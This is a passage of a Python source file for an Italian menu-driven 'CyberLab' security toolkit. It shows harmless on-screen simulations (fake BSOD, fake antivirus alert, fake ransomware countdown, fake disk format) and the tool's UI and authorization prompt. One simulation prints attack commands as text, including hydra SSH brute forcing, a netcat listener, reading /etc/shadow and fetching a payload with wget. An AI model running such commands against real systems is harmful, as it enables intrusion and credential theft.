            input("INVIO per avviare la simulazione...")
        try:
            if m==161:
                confirm()
                print(f"\n\n{'':<15}{BOLD}:(  Your PC ran into a problem and needs to restart.\n")
                for i in range(100,-1,-1):
                    print(f"\r{'':<15}{i}% complete",end="",flush=True); time.sleep(0.3)
                print(f"\n\n{G}[TEST] Simulazione BSOD completata. Nessun impatto reale.{R}")
            elif m==162:
                confirm()
                for i in range(5):
                    os.system("cls" if os.name=="nt" else "clear")
                    print(f"{RED}{BOLD}==========================================")
                    print(f"  ALERT ANTIVIRUS: {i+1} MINACCE RILEVATE")
                    print(f"  Trojan.Win32.Test.{i*27:03d}")
                    print(f"=========================================={R}")
                    time.sleep(1.5)
                print(f"{G}[TEST] Simulazione antivirus completata. Nessuna minaccia reale.{R}")
            elif m==163:
                confirm()
                for f in ["documento.docx","foto_2024.zip","backup.sql","/home/user/.ssh/id_rsa"]:
                    print(f"{RED}Simulazione eliminazione: {f}{R}")
                    for i in range(20):
                        print(f"\r  [{'#'*(i+1)}{'.'*(19-i)}] {(i+1)*5}%",end="",flush=True)
                        time.sleep(0.04)
                    print(f" {G}[SIMULATO]{R}")
                print(f"\n{G}[TEST] Simulazione completata. Nessun file cancellato.{R}")
            elif m==164:
                confirm()
                for _ in range(20):
                    c=random.choice(["nmap -sS 192.168.1.0/24","hydra -l admin -P rockyou.txt ssh://target",
                                     "sqlmap -u http://target --dbs","nc -lvp 4444","ssh root@target",
                                     "cat /etc/shadow","wget http://example/payload"])
                    print(f"{G}root@kali:~# {c}{R}"); time.sleep(random.uniform(0.3,1.0))
                    print(f"{G}[OK]{R}")
                print(f"\n{G}[TEST] Simulazione terminale completata. Nessun comando reale eseguito.{R}")
            elif m==165:
                confirm()
                os.system("cls" if os.name=="nt" else "clear")
                print(f"{RED}{BOLD}==================================================")
                print("  RANSOMWARE SIMULATION - SCREEN ONLY")
                print("  Nessun file cifrato. Nessun pagamento richiesto.")
                print("  Solo dimostrazione visiva a scopo didattico.")
                print("==================================================")
                for rem in range(300,0,-1):
                    h,r=divmod(rem,3600); mn,s=divmod(r,60)
                    print(f"\rTime: {h:02d}:{mn:02d}:{s:02d}  ",end="",flush=True)
                    time.sleep(1)
            elif m==166:
                confirm(); os.system("cls" if os.name=="nt" else "clear")
                print(f"\n{BOLD}Windows Update (simulazione){R}\nConfigurazione: 99%\nNon spegnere.")
                for i in range(200):
                    p=99+(i/200)*0.99; f=int(p/100*50)
                    print(f"\r[{'#'*f}{'.'*(50-f)}] {p:.0f}%",end="",flush=True)
                    time.sleep(0.1)
                print(f"\n\n{G}[TEST] Simulazione aggiornamento completata.{R}")
            elif m==167:
                confirm()
                chars="abcdefghij0123456789!@#$%^&*"
                for _ in range(200):
                    print(f"{G}{''.join(random.choice(chars) if random.random()>0.5 else ' ' for _ in range(80))}{R}")
                    time.sleep(0.05)
                print(f"\n{G}[TEST] Visualizzazione Matrix completata.{R}")
            elif m==168:
                confirm()
                for _ in range(25):
                    print(f"{RED}{random.choice(['ERROR: Kernel panic','FATAL: Permission denied','Segfault (core dumped)','WARNING: Memory unstable','ERROR 0x7B: INACCESSIBLE'])}{R}")
                    time.sleep(0.2)
                print(f"\n{G}[TEST] Simulazione errori completata.{R}")
            elif m==169:
                confirm()
                for _ in range(3):
                    os.system("cls" if os.name=="nt" else "clear")
                    print(f"{RED}{BOLD}NEVER GONNA GIVE YOU UP\nNEVER GONNA LET YOU DOWN\nNEVER GONNA RUN AROUND AND DESERT YOU{R}")
                    time.sleep(1.5)
                print(f"{G}[TEST] Visualizzazione completata.{R}")
            elif m==170:
                confirm()
                print(f"{RED}FORMAT C: /Q /FS:NTFS (simulazione){R}\nATTENZIONE: solo visualizzazione, nessuna formattazione reale.")
                for pct in range(0,101,5):
                    print(f"\r{pct:3d}% [{'#'*(pct//2)}{'.'*(50-pct//2)}]",end="",flush=True)
                    time.sleep(0.2)
                print(f"\n\n{G}[TEST] Simulazione formattazione completata. Nessuna operazione reale.{R}")
        except KeyboardInterrupt:
            print(f"\n{G}[+] Simulazione interrotta.{R}")
        except Exception as e:
            self.err(str(e))

# ============================================================
# UI / LAYOUT RESPONSIVO (ADATTIVO)
# ============================================================
RED="\033[91m"; BOLD="\033[1m"; DIM="\033[2m"; RESET="\033[0m"; CYAN="\033[96m"
YEL="\033[93m"; GRN="\033[92m"; MAG="\033[95m"

def clear(): os.system("cls" if os.name=="nt" else "clear")

def get_cols():
    try: return shutil.get_terminal_size().columns
    except OSError: return 80

def get_lines():
    try: return shutil.get_terminal_size().lines
    except OSError: return 24

def cprint(text, style=""):
    cols = get_cols()
    # Rimuove temporaneamente i codici colore per calcolare la lunghezza reale
    clean_text = re.sub(r'\033\[[0-9;]*m', '', text)
    if len(clean_text) < cols - 2:
        padded = text.center(cols)
    else:
        # Se il terminale è troppo piccolo, allinea a sinistra con un piccolo margine
        padded = "  " + text
    print(f"{style}{padded}{RESET}")

def banner():
    clear()
    cols = get_cols()
    lines = get_lines()
    print("\n" * max(0, (lines - 24) // 2))
    
    if cols >= 76:
        # Banner grande (ASCII art)
        art_lines = [
            "██████╗██╗   ██╗██████╗ ███████╗██████╗ ██╗      ██████╗ ██████╗ ",
            "██╔════╝╚██╗ ██╔╝██╔══██╗██╔════╝██╔══██╗██║     ██╔══██╗██╔══██╗",
            "██║      ╚████╔╝ ██████╔╝█████╗  ██████╔╝██║     ███████║██████╔╝",
            "██║       ╚██╔╝  ██╔══██╗██╔══╝  ██╔══██╗██║     ██╔══██║██╔══██╗",
            "╚██████╗   ██║   ██████╔╝███████╗██║  ██║███████╗██║  ██║██████╔╝",
            "==================================================================",
            "    CYBERLAB PRO v4.4 - 170 moduli attivi",
            "================================================================"
        ]
        for line in art_lines:
            if "====" in line or "CYBERLAB" in line:
                cprint(line, DIM)
            else:
                cprint(line, RED+BOLD)
    else:
        # Banner compatto per terminali piccoli
        cprint("==============================================", RED+BOLD)
        cprint("CYBERLAB PRO v4.4 - 170 moduli attivi", RED+BOLD)
        cprint("==============================================", RED+BOLD)

def show_menu():
    banner()
    print()
    cprint("[+] SELEZIONA CATEGORIA:", RED)
    
    menu_lines = [
        "[1]  Reconnaissance & OSINT       (001 - 015)",
        "[2]  Web Application Auditing    (016 - 030)",
        "[3]  Offensive & Exploit Testing (031 - 045)",
        "[4]  Blue Team & Detection       (046 - 065)",
        "[5]  Cloud & Infrastructure      (066 - 078)",
        "[6]  Cryptography & Data         (079 - 088)",
        "[7]  System Utilities            (089 - 100)",
        "[8]  Wireless & RF Analysis      (101 - 120)",
        "[9]  IoT & Embedded              (121 - 135)",
        "[10] Forensics & Incident Resp.  (136 - 150)",
        "[11] OSINT Extended              (151 - 160)",
        "[12] Visual Test Simulations     (161 - 170)",
        "----------------------------------------------------",
        "[list] Indice completo paginato",
        "[0]    Termina sessione"
    ]
    for line in menu_lines:
        cprint(line)
    print()

def show_index():
    items = sorted(MODULES_MAP.items())
    cols = get_cols()
    two_cols = cols >= 90
    
    rows_per_page = 20 if two_cols else 15
    per_page = rows_per_page * (2 if two_cols else 1)
    total_pages = (len(items) + per_page - 1) // per_page
    page = 1
    
    while True:
        banner()
        start = (page - 1) * per_page
        end = min(start + per_page, len(items))
        page_items = items[start:end]
        
        if two_cols:
            left = page_items[:rows_per_page]
            right = page_items[rows_per_page:]
            col_width = 42
        else:
            left = page_items
            right = []
        
        cprint(f"INDICE COMPLETO - {len(items)} MODULI", RED+BOLD)
        cprint("=" * (88 if two_cols else 50), DIM)
        if two_cols:
            cprint(f"{'ID':<5}{'Modulo':<37}{'ID':<5}{'Modulo':<37}", CYAN+BOLD)
        else:
            cprint(f"{'ID':<5}{'Modulo':<45}", CYAN+BOLD)
        cprint("-" * (88 if two_cols else 50), DIM)
        
        for i in range(rows_per_page):
            if two_cols:
                row = ""
                if i < len(left):
                    mid, (name, _) = left[i]
                    display = name if len(name) <= 34 else name[:31] + "..."
                    row += f"[{mid:03d}] {display:<{col_width - 7}}"
                else:
                    row += " " * col_width
                if i < len(right):
                    mid, (name, _) = right[i]
                    display = name if len(name) <= 34 else name[:31] + "..."
                    row += f"[{mid:03d}] {display:<{col_width - 7}}"
                cprint(row)
            else:
                if i < len(left):
                    mid, (name, _) = left[i]
                    display = name if len(name) <= 42 else name[:39] + "..."
                    cprint(f"[{mid:03d}] {display}")
        
        cprint("=" * (88 if two_cols else 50), DIM)
        bar = ""
        for p in range(1, total_pages + 1):
            if p == page:
                bar += f" {RED}[{p}]{RESET}"
            else:
                bar += f"  {p} "
        cprint(f"Pagina {BOLD}{page}{RESET}/{total_pages}  |  moduli {start+1}-{end}", CYAN)
        cprint(bar)
        cprint(f"Comandi: [n o INVIO]=successiva  [p]=precedente  [1-{total_pages}]=salta  [q]=esci", YEL)
        
        cmd = input("\n  " + "> ".center(cols) + " ").strip().lower()
        if cmd in ("q", "quit", "0"): return
        if cmd in ("", "n", "next"): page = page + 1 if page < total_pages else 1
        elif cmd in ("p", "prev"): page = page - 1 if page > 1 else total_pages
        else:
            try:
                np = int(cmd)
                if 1 <= np <= total_pages: page = np
            except ValueError: pass

def show_cat(lo,hi):
    banner(); print()
    cprint(f"[+] Moduli {lo:03d}-{hi:03d}:", RED)
    print()
    for mid in range(lo,hi+1):
        if mid in MODULES_MAP:
            n,_=MODULES_MAP[mid]
            cprint(f"[{mid:03d}] {n}")
    print()

def auth_gate():
    cols = get_cols()
    lines = get_lines()
    print("\n" * max(0, (lines - 10) // 2))
    cprint("[!] AVVISO LEGALE", RED+BOLD)
    cprint("Usa questo strumento solo su sistemi tuoi o con autorizzazione scritta.")
    cprint("Uso non autorizzato costituisce reato (art. 615-ter c.p.).")
    print()
    ans = input("Confermi di avere l'autorizzazione? (si/no): ".center(cols)).strip().lower()
    if ans not in ("si","sì","s","yes","y"): sys.exit(1)

def interactive():
    engine=MegaEngine()
    cats={1:(1,15),2:(16,30),3:(31,45),4:(46,65),5:(66,78),6:(79,88),
          7:(89,100),8:(101,120),9:(121,135),10:(136,150),11:(151,160),12:(161,170)}
    while True:
        show_menu()
        cols = get_cols()
        ch = input("cyberlab@root:~# ".center(cols)).strip().lower()
        if ch=="0": print("\n" + "Chiusura sessione.".center(cols)); sys.exit(0)
        if ch=="list":
            show_index()
            continue
        try: n=int(ch)
        except ValueError: input("Comando non valido. INVIO...".center(cols)); continue
        if n in cats:
            show_cat(*cats[n])
            sub=input("modulo> ".center(cols)).strip()
            if not sub: continue
            try: n=int(sub)
            except ValueError: continue
        if n not in MODULES_MAP:
            input(f"Modulo {n} inesistente. INVIO...".center(cols)); continue
        name,_=MODULES_MAP[n]
        print("\n" + f"[*] [{n:03d}] {name}".center(cols))

        prompt = get_prompt(n)
        if prompt is None: target = ""
        else: target = input(f"{prompt}: ".center(cols)).strip()

        print("\n" + "="*60)
        try: engine.dispatch(n, target)
        except Exception as e: print(f"[x] {type(e).__name__}: {e}")
        print("="*60)
        input("\n" + "INVIO per tornare al menu...".center(cols))

if __name__=="__main__":
    try: auth_gate(); interactive()
    except KeyboardInterrupt: print("\nUscita."); sys.exit(0)
